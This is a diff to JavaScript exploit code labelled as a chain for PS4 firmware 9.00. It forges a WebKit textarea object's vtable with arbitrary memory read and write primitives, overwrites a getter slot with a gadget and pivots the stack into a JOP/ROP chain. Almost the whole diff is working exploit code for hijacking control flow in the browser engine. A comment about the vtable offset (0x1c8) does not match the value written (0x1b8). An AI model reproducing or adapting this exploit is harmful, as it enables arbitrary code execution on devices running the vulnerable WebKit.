@@ -471,7 +471,7 @@ class Chain900Base extends ChainBase {
 const rop_ta = document.createElement('textarea');
 
 // Chain for PS4 9.00
-/*class Chain900 extends Chain900Base {
+class Chain900 extends Chain900Base {
     constructor() {
         super();
 
@@ -528,94 +528,8 @@ const rop_ta = document.createElement('textarea');
         const rax_ptrs_p = get_view_vector(rax_ptrs);
         this.rax_ptrs = rax_ptrs;
 
-        rw.write64(rax_ptrs, 0x28, this.get_gadget(jop2));
+        rw.write64(rax_ptrs, 0x30, this.get_gadget(jop2));
         rw.write64(rax_ptrs, 0x1c, this.get_gadget(jop3));
-        rw.write64(rax_ptrs, 0x58, this.get_gadget(jop4));
-        rw.write64(rax_ptrs, 0x10, this.get_gadget(jop5));
-        rw.write64(rax_ptrs, 0, this.get_gadget(jop6));
-        // value to pivot rsp to
-        rw.write64(rax_ptrs, 0x18, this.stack_addr);
-
-        const jop_buffer = new Uint8Array(8);
-        const jop_buffer_p = get_view_vector(jop_buffer);
-        this.jop_buffer = jop_buffer;
-
-        rw.write64(jop_buffer, 0, rax_ptrs_p);
-
-        clone_p.write64(offset_js_inline_prop + 8*2, jop_buffer_p);
-    }
-
-    run() {
-        this.check_stale();
-        this.check_is_empty();
-        this.check_is_branching();
-
-        // jump to JOP chain
-        this.ta_clone.scrollLeft;
-    }
-}
-const Chain = Chain900;*/
-
-// Chain for PS4 9.00
-class Chain900 extends Chain900Base {
-    constructor() {
-        super();
-
-        // sizeof JSC:JSObject, the JSCell + the butterfly field
-        const js_size = 0x10;
-        // sizeof WebCore::JSHTMLTextAreaElement, subclass of JSObject
-        const js_ta_size = 0x20;
-        // start of the array of inline properties (JSValues)
-        const offset_js_inline_prop = 0x10;
-        // Sizes may vary between webkit versions so we just assume a size
-        // that we think is large enough for all of them.
-        const vtable_size = 0x1000;
-        const webcore_ta_size = 0x180;
-
-        const ta_clone = {};
-        this.ta_clone = ta_clone;
-        const clone_p = mem.addrof(ta_clone);
-        const ta_p = mem.addrof(rop_ta);
-
-        for (let i = js_size; i < js_ta_size; i += 8) {
-            clone_p.write64(i, ta_p.read64(i));
-        }
-
-        const webcore_ta = ta_p.readp(offset_textarea_impl);
-        const m_wrapped_clone = new Uint8Array(
-            make_buffer(webcore_ta, webcore_ta_size)
-        );
-        this.m_wrapped_clone = m_wrapped_clone;
-
-        // Replicate the vtable as much as possible or else the garbage
-        // collector will crash. It uses functions from the vtable.
-        //
-        // There is no need to restore the original vtable pointer later since
-        // it points to a copy with only offset 0x1c8 changed. The scrollLeft
-        // getter is not used by the GC.
-        const vtable_clone = new Uint8Array(
-            make_buffer(webcore_ta.readp(0), vtable_size)
-        );
-        this.vtable_clone = vtable_clone
-
-        clone_p.write64(
-            offset_textarea_impl,
-            get_view_vector(m_wrapped_clone),
-        );
-        rw.write64(m_wrapped_clone, 0, get_view_vector(vtable_clone));
-
-        clone_p.write64(0, ta_p.read64(0));
-
-        // 0x1c8 is the offset of the scrollLeft getter native function
-        rw.write64(vtable_clone, 0x1b8, this.get_gadget(jop1));
-
-        // for the JOP chain
-        const rax_ptrs = new Uint8Array(0x100);
-        const rax_ptrs_p = get_view_vector(rax_ptrs);
-        this.rax_ptrs = rax_ptrs;
-
-        rw.write64(rax_ptrs, 0x28, this.get_gadget(jop2));
-        rw.write64(rax_ptrs, 0x7c, this.get_gadget(jop3));
         rw.write64(rax_ptrs, 0x58, this.get_gadget(jop4));
         rw.write64(rax_ptrs, 0x10, this.get_gadget(jop5));
         rw.write64(rax_ptrs, 0, this.get_gadget(jop6));
